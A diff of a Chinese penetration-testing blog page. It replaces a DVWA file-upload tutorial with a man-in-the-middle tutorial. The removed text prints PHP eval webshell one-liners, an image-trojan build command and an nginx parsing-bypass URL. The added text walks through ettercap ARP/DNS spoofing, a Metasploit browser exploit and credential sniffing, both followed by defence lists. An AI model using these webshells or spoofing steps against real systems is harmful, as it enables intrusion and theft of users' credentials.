@@ -6,27 +6,27 @@
     
 
     
-    <title>Web安全 - 文件上传漏洞 | Hexo</title>
+    <title>中间人攻击的原理和应用 | Hexo</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="keywords" content="渗透,安全" />
     
-    <meta name="description" content="什么是文件上传漏洞由于管理员在代码编写、环境配置、权限管理等方面的疏忽，用户在客户端能够上传脚本文件，并且有权限在服务器执行，就会导致文件上传漏洞，攻击者可以上传木马、webshell 等恶意脚本，获取服务器权限、敏感信息，危害很大。 下面文章通过开源的 DVWA 渗透测试环境为例，来模拟文件上传漏洞的利用过程，DVWA 靶机的后台是 PHP 语言，其他语言的后台漏洞原理和防御思路都是相通的。DV">
+    <meta name="description" content="中间人攻击的原理首先需要理解为什么会产生中间人攻击，是通过什么原理实现的，这里主要用到 ARP 协议和 DNS 协议。 ARP 协议及欺骗产生的原理地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web安全 - 文件上传漏洞">
-<meta property="og:url" content="http://yoursite.com/2019/12/18/Web%E5%AE%89%E5%85%A8%20-%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="中间人攻击的原理和应用">
+<meta property="og:url" content="http://yoursite.com/2020/10/15/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="什么是文件上传漏洞由于管理员在代码编写、环境配置、权限管理等方面的疏忽，用户在客户端能够上传脚本文件，并且有权限在服务器执行，就会导致文件上传漏洞，攻击者可以上传木马、webshell 等恶意脚本，获取服务器权限、敏感信息，危害很大。 下面文章通过开源的 DVWA 渗透测试环境为例，来模拟文件上传漏洞的利用过程，DVWA 靶机的后台是 PHP 语言，其他语言的后台漏洞原理和防御思路都是相通的。DV">
+<meta property="og:description" content="中间人攻击的原理首先需要理解为什么会产生中间人攻击，是通过什么原理实现的，这里主要用到 ARP 协议和 DNS 协议。 ARP 协议及欺骗产生的原理地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://my.lipeilipei.top/003%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png">
-<meta property="article:published_time" content="2019-12-18T04:00:00.000Z">
-<meta property="article:modified_time" content="2020-04-12T10:38:20.611Z">
+<meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201209092600.png">
+<meta property="article:published_time" content="2020-10-15T04:00:00.000Z">
+<meta property="article:modified_time" content="2020-12-09T01:26:27.855Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://my.lipeilipei.top/003%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png">
+<meta name="twitter:image" content="http://my.lipeilipei.top/images/2020/20201209092600.png">
     
 
     
@@ -169,14 +169,14 @@ var _hmt = _hmt || [];
 </div>
 
                         <div class="main-body-content">
-                            <article id="post-Web安全 - 文件上传漏洞" class="article article-single article-type-post" itemscope itemprop="blogPost">
+                            <article id="post-中间人攻击的原理和应用" class="article article-single article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        Web安全 - 文件上传漏洞
+        中间人攻击的原理和应用
         </h1>
     
 
@@ -187,16 +187,16 @@ var _hmt = _hmt || [];
                 
   <div class="article-date">
     <i class="fa fa-calendar"></i>
-    <a href="/2019/12/18/Web%E5%AE%89%E5%85%A8%20-%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
-       <time datetime="2019-12-18T04:00:00.000Z" itemprop="datePublished">2019-12-18</time>
+    <a href="/2020/10/15/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8/" class="article-date">
+       <time datetime="2020-10-15T04:00:00.000Z" itemprop="datePublished">2020-10-15</time>
     </a>
   </div>
 
 
 <div class="article-date">
   <i class="fa fa-calendar-plus-o"></i>
-  <a href="/2019/12/18/Web%E5%AE%89%E5%85%A8%20-%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
-     <time datetime="2020-04-12T10:38:20.611Z" itemprop="dateModified">2020-04-12</time>
+  <a href="/2020/10/15/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8/" class="article-date">
+     <time datetime="2020-12-09T01:26:27.855Z" itemprop="dateModified">2020-12-09</time>
   </a>
 </div>
 
@@ -223,55 +223,59 @@ var _hmt = _hmt || [];
 
             
 
-            <h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><p>由于管理员在代码编写、环境配置、权限管理等方面的疏忽，用户在客户端能够上传脚本文件，并且有权限在服务器执行，就会导致文件上传漏洞，攻击者可以上传木马、webshell 等恶意脚本，获取服务器权限、敏感信息，危害很大。</p>
-<p>下面文章通过开源的 DVWA 渗透测试环境为例，来模拟文件上传漏洞的利用过程，DVWA 靶机的后台是 PHP 语言，其他语言的后台漏洞原理和防御思路都是相通的。<br>DVWA 共有四个等级：</p>
-<ul>
-<li><code>low</code>         (低安全等级)</li>
-<li><code>medium</code>      (中安全等级)</li>
-<li><code>high</code>        (高安全等级)</li>
-<li><code>impossible</code>  (最高等级)</li>
-</ul>
-<p>其中 impossible 等级是最安全的等级，不存在漏洞（我的能力范围内）。</p>
-<h2 id="构造脚本"><a href="#构造脚本" class="headerlink" title="构造脚本"></a>构造脚本</h2><p>在本地创建一个 <code>1.php</code> 文件，内容只有一行，是php一句话木马，也就是简单的webshell。让被攻击的服务器解析此文件，通过 get 方法获取请求参数cmd，并使用 eval 函数来执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">"cmd"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+            <h2 id="中间人攻击的原理"><a href="#中间人攻击的原理" class="headerlink" title="中间人攻击的原理"></a>中间人攻击的原理</h2><p>首先需要理解为什么会产生中间人攻击，是通过什么原理实现的，这里主要用到 ARP 协议和 DNS 协议。</p>
+<h5 id="ARP-协议及欺骗产生的原理"><a href="#ARP-协议及欺骗产生的原理" class="headerlink" title="ARP 协议及欺骗产生的原理"></a>ARP 协议及欺骗产生的原理</h5><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗</p>
+<h5 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h5><p>网关(Gateway)又称网间连接器、协议转换器。网关在网络层以上实现网络互连，是复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。使用在不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同层–应用层，简单的来说你电脑如果要上网需要通过网关，流量都会经过网关，攻击者只需要利用arp欺骗把自己主机伪装成网关，那么其他电脑的流量就会经过攻击者的主机。</p>
+<h5 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h5><p>DNS即Domain Name System 的缩写，是把主机域名解析IP地址的系统，解决了IP地址难记的问题，用相对好记的域名就可以对服务器进行访问，即使服务器更换了IP地址，我们依旧可以通过域名访问该服务器，这样能够使我们更方便的访问互联网。</p>
+<h5 id="DNS-欺骗的原理"><a href="#DNS-欺骗的原理" class="headerlink" title="DNS 欺骗的原理"></a>DNS 欺骗的原理</h5><p>DNS欺骗就是利用了DNS协议设计时的一个非常严重的安全缺陷。首先欺骗者向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的当真实的DNS应答包返回时则被丢弃</p>
+<h2 id="中间人攻击的应用场景"><a href="#中间人攻击的应用场景" class="headerlink" title="中间人攻击的应用场景"></a>中间人攻击的应用场景</h2><h5 id="1-场景一（DNS-劫持跳转到指定网站）"><a href="#1-场景一（DNS-劫持跳转到指定网站）" class="headerlink" title="1. 场景一（DNS 劫持跳转到指定网站）"></a>1. 场景一（DNS 劫持跳转到指定网站）</h5><p>通过这种方式，受害人主动或者被诱导访问指定域名后自动跳转到设置好的恶意地址，从而进一步对目标进行钓鱼，社工等进深入渗透。</p>
+<p>可以进行流量欺骗的工具有很多，这里以 <code>ettercap</code> 为例，在 kali 打开 <code>ettercap</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
+<p>选择网卡，点击对勾确定</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915204212.png" alt=""></p>
+<p>先点击搜索按钮 <code>Scan for hosts</code> 搜索局域网内的机器，再点击主机列表按钮 <code>Hosts list</code> 展示搜索到的机器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915204437.png" alt=""></p>
+<p>将网关机器添加到 target 1，将目标机器添加到 target 2</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915204810.png" alt=""></p>
+<p>开启 ARP 欺骗，开启后目标机器的流量都会通过 kali 攻击机 (kali 伪装成了网关)</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915205011.png" alt=""></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915204940.png" alt=""></p>
+<p>在 <code>/etc/ettercap/etter.dns</code> 文件最后面添加这么一行并保存，意思是目标机器访问所有百度的域名实际上都访问到攻击机器的 IP 192.168.0.105</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.baidu.com     A       192.168.0.105</span><br></pre></td></tr></table></figure>
+<p>开启 DNS 欺骗，依次点击 <code>menu</code> - <code>Plugins</code> - <code>Manage plugins</code> - <code>dns_spoof</code>， 双击这个 dns 欺骗插件，选择成功后插件前面会有个星号</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915205653.png" alt=""></p>
+<p>然后点击 ettercap 左上角按钮开启欺骗(软件打开时默认是开启的就不用管)</p>
+<p>在目标机器访问百度的主页，在攻击机上看到目标机器的请求</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915210249.png" alt=""></p>
+<p>同时发现目标机器自动跳转到了必应的主页</p>
+<p><img src="http://my.lipeilipei.top/images/2020/%E4%B8%AD%E9%97%B4%E4%BA%BA.gif" alt=""></p>
+<p>这是因为在 <code>/etc/ettercap/etter.dns</code> 设置了访问百度域名自动跳转到 <code>192.168.0.105</code>机器，在 <code>192.168.0.105</code> 我开启了apache web 服务，并在 web 目录下存放了一个 index.html 文件，文件内容是打开后自动跳转到必应</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915210730.png" alt=""></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span>  <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0;url=http://cn.bing.com"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><h5 id="low-等级"><a href="#low-等级" class="headerlink" title="low 等级"></a>low 等级</h5><p>登陆 DVWA 环境，进入文件上传模块并上传创建的 1.php 恶意文件，没有任何阻碍，直接上传成功，并且给出了文件保存的路径。<br><img src="http://my.lipeilipei.top/003%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<h5 id="medium-等级"><a href="#medium-等级" class="headerlink" title="medium 等级"></a>medium 等级</h5><p>按照上一步直接上传，发现上传失败，提示只能上传图片格式的文件<br><img src="http://my.lipeilipei.top/002%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<p>服务器是校验了我们的文件后缀名吗，将 1.php 的文件名修改成 666.png 图片格式尝试一下<br><img src="http://my.lipeilipei.top/015.png" alt=""><br><img src="http://my.lipeilipei.top/014.png" alt=""></p>
-<p>可以上传成功，但是通过修改后缀的方式，它并不是一个标准的图片或者php文件，有什么办法可以上传php文件但是不被检测到？</p>
-<p>先正常上传一张图片，观察上传文件的 HTTP 请求，可以看到请求参数中的 <code>Content-Type</code> 是 <code>image/jpeg</code>，medium 安全等级检测就是这个字段。<br><img src="http://my.lipeilipei.top/004%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<p>这里需要通过抓包修改请求了，以 Charles 为例，开启它的请求拦截功能，配置好浏览器代理，选择 1.php 文件并点击上传，请求被 Charles 拦截，当前请求参数中的 <code>Content-Type</code> 值是 <code>application/octet-stream</code>, 把它修改为 <code>image/jpeg</code> 并将修改后的请求放行。<br><img src="http://my.lipeilipei.top/006%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<p>此时前端页面显示上传成功。<br><img src="http://my.lipeilipei.top/003%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<p>这里修改的 <code>Content-Type</code> 实际上是遵循了 MIME 标准, jpe、jpg、jpeg等后缀的文件对应的类型都是 <code>image/jpeg</code>，还可以修改成其他的类型，具体的场景具体分析需要选择哪一种</p>
-<blockquote>
-<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br><br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
-</blockquote>
-<p>更多请查看 <a href="https://www.w3school.com.cn/media/media_mimeref.asp" target="_blank" rel="noopener"><strong>MIME 参考手册</strong></a>。</p>
-<h5 id="high-等级"><a href="#high-等级" class="headerlink" title="high 等级"></a>high 等级</h5><p>直接使用前两步的方法进行上传，都不能上传成功，在 high 安全等级下，其实还校验了图片的具体内容，也就是我们上传的文件中如果只有恶意代码肯定会被拦截，绕过方式就是制作图片木马。<br>在本地选择一个 1.jpg 图片文件，和前面创建的 1.php 木马文件结合在一起，生成一个新的 2.jpg 文件。<br>打开cmd命令行在当前路径下执行拼接文件的命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg</span><br></pre></td></tr></table></figure>
-<p>这个 2.jpg 文件可以正常双击打开，与普通图片看起来没有什么区别，但是用记事本打开这张图片观察最后面就会发现我们的php代码<br><img src="http://my.lipeilipei.top/007%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<p>直接上传新建的 2.jpg 文件就可以上传成功了。<br><img src="http://my.lipeilipei.top/008%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png" alt=""></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h5 id="1-包含-webshell-木马的-php-文件"><a href="#1-包含-webshell-木马的-php-文件" class="headerlink" title="1. 包含 webshell 木马的 php 文件"></a>1. 包含 webshell 木马的 php 文件</h5><p>前面在 low 和 medium 安全等级中都成功上传了 1.php 文件且显示了存储的相对路径，将相对路径填写到当前url的后面并请求，因为它是脚本文件，所以服务器会直接解析，但是发现解析报错了。<br><img src="http://my.lipeilipei.top/009.png" alt=""></p>
-<p>原因是还没有传递参数，恶意木马中使用的是 get 请求，参数是 cmd ，所以这里需要在请求url的后面加上参数，如下面几个例子</p>
-<p>1.查看 phpinfo 信息<br><img src="http://my.lipeilipei.top/011.png" alt=""></p>
-<p>2.查看服务器当前系统用户（通过PHP内置函数执行系统命令）<br><img src="http://my.lipeilipei.top/010.png" alt=""></p>
-<p>3.遍历目录<br><img src="http://my.lipeilipei.top/000%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%A1%A5%E5%85%85001.png" alt=""></p>
-<p><strong>注意</strong>：最后面的分号不要忘记，php代码块是以分号结尾。</p>
-<h5 id="2-包含-webshell-木马的图片文件"><a href="#2-包含-webshell-木马的图片文件" class="headerlink" title="2. 包含 webshell 木马的图片文件"></a>2. 包含 webshell 木马的图片文件</h5><p>将上传的带有恶意脚本的图片相对路径直接填写到当前url后面并请求，因为是图片文件，所以服务器会将图片展示出来，而不会解析它里面的恶意代码。<br><img src="http://my.lipeilipei.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E017.png" alt=""></p>
-<p>按照前面的方法在URL后面加上参数并请求发现服务器没有把它当成脚本来解析，仍然显示的图片本身。<br>如果被攻击服务器的web服务器是 nginx 的话，nginx有一个解析漏洞，就是只要一个请求最后面的后缀名是脚本格式的时候，他就会把整个程序当作脚本来执行。<br>所以我们构造这样的 url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.150&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;2.jpg&#x2F;2222.php</span><br></pre></td></tr></table></figure>
-<p>前面是图片的地址，后面加上 <code>/xxx.php</code> , xxx 可以随便填写，重要的是要把整个请求最后的后缀名设置成 <code>.php</code>, 然后再加上参数，完整如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.150&#x2F;DVWA-master&#x2F;hackable&#x2F;uploads&#x2F;2.jpg&#x2F;2222.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
-<p>这样再去请求，服务器就会把我们上传的带有一句话木马的 2.jpg 图片当作脚本来执行，返回结果上面部分的乱码是图片信息，把浏览器滚动条往下拉就能看到参数请求的信息。<br><img src="http://my.lipeilipei.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E018.png" alt=""></p>
-<h5 id="3-post-webshell"><a href="#3-post-webshell" class="headerlink" title="3. post webshell"></a>3. post webshell</h5><p>如果构造的 webshell 是post请求怎么利用这个漏洞呢</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"cmd"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传文件过程是一样的，只是在利用漏洞的时候需要以post的方式提交请求，这里使用 hackbar 插件方便操作<br><img src="http://my.lipeilipei.top/012.png" alt=""></p>
-<h2 id="“中国菜刀”"><a href="#“中国菜刀”" class="headerlink" title="“中国菜刀”"></a>“中国菜刀”</h2><p>上传了 webshell 后，手动在浏览器获取系统敏感信息、遍历目录结构还是很麻烦，并且有一定的运气成分，例如 web服务器是nginx是猜测的，如果是 apache、IIS 的话就得继续猜解尝试其他找漏洞的方法了，”中国菜刀” 这个软件就可以很方便的解决这个问题，只要知道包含webshell木马文件的路径和请求参数即可，剩下的它会自动处理。</p>
-<p>打开主页面，右键点击添加，填写webshell地址，参数名等信息并保存<br><img src="http://my.lipeilipei.top/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%802.png" alt=""></p>
-<p>在保存的这条数据右键打开”文件管理”，第一次连接速度比较慢，大概10秒左右，然后就可以看到服务器的目录结构了<br><img src="http://my.lipeilipei.top/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%804.png" alt=""></p>
-<p>也可以在这条数据上右键打开”虚拟终端”，可以在命令行下操作获取信息<br><img src="http://my.lipeilipei.top/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%805.png" alt=""></p>
-<h2 id="文件上传漏洞的防御"><a href="#文件上传漏洞的防御" class="headerlink" title="文件上传漏洞的防御"></a>文件上传漏洞的防御</h2><p>知道了文件上传漏洞产生的过程和原因，在配置环境和编写代码的时候就可以从以下方面来避免漏洞的产生。</p>
-<p>1.检查文件扩展名（防止服务器以非图片格式来解析文件）<br>2.检查文件MIME（例如jpe、jpg、jpeg等后缀的文件对应的类型都是 image/jpeg）<br>3.检测文件内容（防止文件中包含webshell）<br>4.将上传的文件重命名（防止攻击者通过文件名猜解webshell路径）<br>5.存储服务器和业务服务器分离<br>6.图片二次渲染（彻底清除上传文件中包含的webshell）<br>7.尽可能避免文件存储的路径被泄露（例如不要在请求响应中包含上传地址）</p>
+<h5 id="2-场景二（DNS-劫持拿下-shell）"><a href="#2-场景二（DNS-劫持拿下-shell）" class="headerlink" title="2. 场景二（DNS 劫持拿下 shell）"></a>2. 场景二（DNS 劫持拿下 shell）</h5><p>msf 设置监听，使用 <code>ms14-064</code> 模块攻击 IE 浏览器</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915214951.png" alt="">、</p>
+<p>设置好参数后执行，生成一个攻击 URL，复制到上面场景一中的 web 目录下的 index.html 文件里面</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20200915215245.png" alt=""></p>
+<p>再次让目标机器去访问百度，msf 拿到 shell</p>
+<h5 id="3-场景三（盗取目标用户的账号密码）"><a href="#3-场景三（盗取目标用户的账号密码）" class="headerlink" title="3. 场景三（盗取目标用户的账号密码）"></a>3. 场景三（盗取目标用户的账号密码）</h5><p>ARP 欺骗可以抓到目标机器 HTTP 的包，在目标机器打开一个使用 http 的网站并登录，在 kali 攻击机的 ettercap 日志就能直接看到登录提交的数据包，抓到受害者的账号密码</p>
+<p><img src="http://my.lipeilipei.top/images/2020/ARP.gif" alt=""></p>
+<h5 id="4-场景四（抓取目标机器访问的网站图片）"><a href="#4-场景四（抓取目标机器访问的网站图片）" class="headerlink" title="4. 场景四（抓取目标机器访问的网站图片）"></a>4. 场景四（抓取目标机器访问的网站图片）</h5><p>安装 <code>driftnet</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install driftnet</span><br></pre></td></tr></table></figure>
+
+<p>指定网卡监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="5-dns欺骗深入利用："><a href="#5-dns欺骗深入利用：" class="headerlink" title="5. dns欺骗深入利用："></a>5. dns欺骗深入利用：</h5><p>可以利用来钓鱼，组合浏览器漏洞组合 csrf 组合 xss（beef上线）配合 msf 等一系列漏洞。</p>
+<h2 id="防御dns欺骗"><a href="#防御dns欺骗" class="headerlink" title="防御dns欺骗"></a>防御dns欺骗</h2><ul>
+<li>使用最新版本的DNS服务器软件，及时安装补丁</li>
+<li>关闭DNS服务器的递归功能</li>
+<li>限制区域传输范围</li>
+<li>限制动态更新</li>
+<li>采用分层的DNS体系结构</li>
+<li>采用https</li>
+</ul>
 
         </div>
         <footer class="article-footer">
@@ -324,17 +328,17 @@ window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMin
             "@type": "Person",
             "name": "John Doe"
         },
-        "headline": "Web安全 - 文件上传漏洞",
-        "image": "http://yoursite.comhttp://my.lipeilipei.top/003%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.png",
+        "headline": "中间人攻击的原理和应用",
+        "image": "http://yoursite.comhttp://my.lipeilipei.top/images/2020/20201209092600.png",
         "keywords": "渗透 安全",
         "genre": "安全",
-        "datePublished": "2019-12-18",
-        "dateCreated": "2019-12-18",
-        "dateModified": "2020-04-12",
-        "url": "http://yoursite.com/2019/12/18/Web安全 - 文件上传漏洞/",
-        "description": "什么是文件上传漏洞由于管理员在代码编写、环境配置、权限管理等方面的疏忽，用户在客户端能够上传脚本文件，并且有权限在服务器执行，就会导致文件上传漏洞，攻击者可以上传木马、webshell 等恶意脚本，获取服务器权限、敏感信息，危害很大。
-下面文章通过开源的 DVWA 渗透测试环境为例，来模拟文件上传漏洞的利用过程，DVWA 靶机的后台是 PHP 语言，其他语言的后台漏洞原理和防御思路都是相通的。DV",
-        "wordCount": 284
+        "datePublished": "2020-10-15",
+        "dateCreated": "2020-10-15",
+        "dateModified": "2020-12-09",
+        "url": "http://yoursite.com/2020/10/15/中间人攻击的原理和应用/",
+        "description": "中间人攻击的原理首先需要理解为什么会产生中间人攻击，是通过什么原理实现的，这里主要用到 ARP 协议和 DNS 协议。
+ARP 协议及欺骗产生的原理地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回",
+        "wordCount": 265
     }
 </script>
 
@@ -368,20 +372,10 @@ window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMin
         
 <nav id="article-nav">
     
-        <a href="/2020/01/11/Web%E5%AE%89%E5%85%A8%20-%20CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">newer</strong>
-        <p class="article-nav-title">
-        
-            Web安全 - CSRF（跨站请求伪造）
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2019/11/27/kali%20linux%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">older</strong>
-        <p class="article-nav-title">kali linux 无法上网解决办法</p>
+        <p class="article-nav-title">数据库提权(二) sql server 提权</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
